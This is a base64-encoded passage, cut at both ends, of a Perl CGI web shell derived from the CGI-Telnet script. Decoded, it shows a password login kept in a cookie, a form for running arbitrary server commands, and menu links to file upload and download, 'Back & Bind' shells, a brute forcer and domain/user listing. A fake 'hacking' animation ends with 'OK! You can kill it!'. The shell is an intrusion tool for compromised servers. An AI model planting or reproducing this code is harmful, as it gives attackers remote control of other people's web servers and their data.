3N1Ym1pdCcgb25jbGljaz0nIiArIGJhY2sgKyAiJyB2YWx1ZT1DYW5jZWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9yZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCglpZihmPT0nZicpDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsNCgl9ZWxzZQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOw0KCX0NCn0NCjwvc2NyaXB0Pg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8Y2VudGVyPjxjb2RlPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQoJPHRkIGFsaWduPSJjZW50ZXIiIHJvd3NwYW49Mj4NCgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4NCgk8L3RkPg0KDQoJPHRkPg0KDQoJCTxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPiRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9PC9mb250Pg0KCTwvdGQ+DQoJPHRkPlNlcnZlciBJUDo8Zm9udCBjb2xvcj0iI2JiMDAwMCI+ICRFTlZ7J1NFUlZFUl9BRERSJ308L2ZvbnQ+IHwgWW91ciBJUDogPGZvbnQgY29sb3I9IiNiYjAwMDAiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+DQoJPC90ZD4NCg0KPC90cj4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjMiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uIj5Ib21lPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5HVUk8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YmFja2JpbmQiPkJhY2sgJiBCaW5kPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jaGVja2xvZyI+Q2hlY2sgTG9nPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb21haW5zdXNlciI+RG9tYWlucy9Vc2VyczwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwNCjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSIjIj5IZWxwPC9hPg0KDQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KDQoJcHJpbnQgPDxFTkQ7DQo8cHJlPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7DQogIGlmKCh0eXBlb2YgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQgPT0gInVuZGVmaW5lZCIpIHx8ICh0eXBlb2YgZWxlbWVudC5pbm5lckhUTUwgPT0gInVuZGVmaW5lZCIpKSB7DQogICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTsJLy8gTmV2ZXIgcnVuLg0KICAgIHJldHVybjsNCiAgfQ0KICB0aGlzLmVsZW1lbnQgPSBlbGVtZW50Ow0KICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsNCiAgdGhpcy5pbnRlcnZhbCA9ICh0eXBlb2YgaW50ZXJ2YWwgPT0gInVuZGVmaW5lZCIgPyAxMDAgOiBpbnRlcnZhbCk7DQogIHRoaXMub3JpZ1RleHQgPSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MOw0KICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0Ow0KICB0aGlzLmN1cnNvciA9IChjdXJzb3IgPyBjdXJzb3IgOiAiIik7DQogIHRoaXMuY3VycmVudFRleHQgPSAiIjsNCiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogIHRoaXMuZWxlbWVudC50eXBpbmdUZXh0ID0gdGhpczsNCiAgaWYodGhpcy5lbGVtZW50LmlkID09ICIiKSB0aGlzLmVsZW1lbnQuaWQgPSAidHlwaW5ndGV4dCIgKyBUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCsrOw0KICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOw0KICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICB0aGlzLnRhZ0J1ZmZlciA9ICIiOw0KICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiIjsNCn0NClR5cGluZ1RleHQuYWxsID0gbmV3IEFycmF5KCk7DQpUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCA9IDA7DQpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgew0KICBmb3IodmFyIGkgPSAwOyBpIDwgVHlwaW5nVGV4dC5hbGwubGVuZ3RoOyBpKyspIFR5cGluZ1RleHQuYWxsW2ldLnJ1bigpOw0KfQ0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7DQogIGlmKHRoaXMucnVubmluZykgcmV0dXJuOw0KICBpZih0eXBlb2YgdGhpcy5vcmlnVGV4dCA9PSAidW5kZWZpbmVkIikgew0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuDQogICAgcmV0dXJuOw0KICB9DQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsNCi8vICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dC5yZXBsYWNlKC88KFtePF0pKj4vLCAiIik7ICAgICAvLyBTdHJpcCBIVE1MIGZyb20gdGV4dC4NCiAgaWYodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoKSB7DQogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciA9ICI8IjsNCiAgICAgIHRoaXMuaW5UYWcgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9ICI+IjsNCiAgICAgIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICImIjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9ICI7IjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSB7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgIH0NCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsNCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MICs9ICh0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGggLSAxID8gKHR5cGVvZiB0aGlzLmN1cnNvciA9PSAiZnVuY3Rpb24iID8gdGhpcy5jdXJzb3IodGhpcy5jdXJyZW50VGV4dCkgOiB0aGlzLmN1cnNvcikgOiAiIik7DQogICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsNCiAgfSBlbHNlIHsNCgl0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQoJdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogICAgICAgIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICAgICAgICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2soKTsNCiAgfQ0KfQ0KPC9zY3JpcHQ+DQo8L3ByZT4NCg0KPGZvbnQgc3R5bGU9ImZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsiPkNvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhIDwvZm9udD48YnI+PGJyPg0KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+DQo8dGJvZHk+PHRyPg0KPHRkIHZhbGlnbj0idG9wIiBiYWNrZ3JvdW5kPSJodHRwOi8vZGwuZHJvcGJveC5jb20vdS8xMDg2MDA1MS9pbWFnZXMvbWF0cmFuLmdpZiI+PHAgaWQ9ImhhY2siIHN0eWxlPSJtYXJnaW4tbGVmdDogM3B4OyI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4NCg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPiBUcnlpbmcgY29ubmVjdCB0byBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD48YnI+DQo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PC9mb250PiBDaGVja2luZyBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD4gPGJyPg0KDQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPg0KDQo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD5cJCBDb25uZWN0ZWQgQ29tbWFuZCEgPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+DQo8L3RyPg0KPC90Ym9keT48L3RhYmxlPg0KPGJyPg0KDQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsNClR5cGluZ1RleHQucnVuQWxsKCk7DQoNCjwvc2NyaXB0Pg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEh0bWxTcGVjaWFsQ2hhcnMoJCl7DQoJbXkgJHRleHQgPSBzaGlmdDsNCgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsNCgkkdGV4dCA9fiBzLyIvJnF1b3Q7L2c7DQoJJHRleHQgPX4gcy8nLyYjMDM5Oy9nOw0KCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7DQoJJHRleHQgPX4gcy8+LyZndDsvZzsNCglyZXR1cm4gJHRleHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBsaW5rIGZvciBkaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBBZGRMaW5rRGlyKCQpDQp7DQoJbXkgJGFjPXNoaWZ0Ow0KCW15IEBkaXI9KCk7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJQGRpcj1zcGxpdCgvXFwvLCRDdXJyZW50RGlyKTsNCgl9ZWxzZQ0KCXsNCgkJQGRpcj1zcGxpdCgiLyIsJnRyaW0oJEN1cnJlbnREaXIpKTsNCgl9DQoJbXkgJHBhdGg9IiI7DQoJbXkgJHJlc3VsdD0iIjsNCglmb3JlYWNoIChAZGlyKQ0KCXsNCgkJJHBhdGggLj0gJF8uJFBhdGhTZXA7DQoJCSRyZXN1bHQuPSI8YSBocmVmPSc/YT0iLiRhYy4iJmQ9Ii4kcGF0aC4iJz4iLiRfLiRQYXRoU2VwLiI8L2E+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4NCg0KUGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4NCkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4NClBhc3N3b3JkOjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icCI+DQo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeyd9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9nb3V0DQp7DQoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQ0KCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkmUHJpbnRMb2dvdXRTY3JlZW47DQoNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCglleGl0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyOw0KCQlwcmludCAmTGlzdERpcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoNCgkJfQ0KCQkmUHJpbnRMb2dpbkZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KCW15ICRkaXI9ICI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImNvbW1hbmQiKS4iPC9zcGFuPiI7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nIzY2ZmY2Nic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNTAiIG5hbWU9ImMiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQidHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0t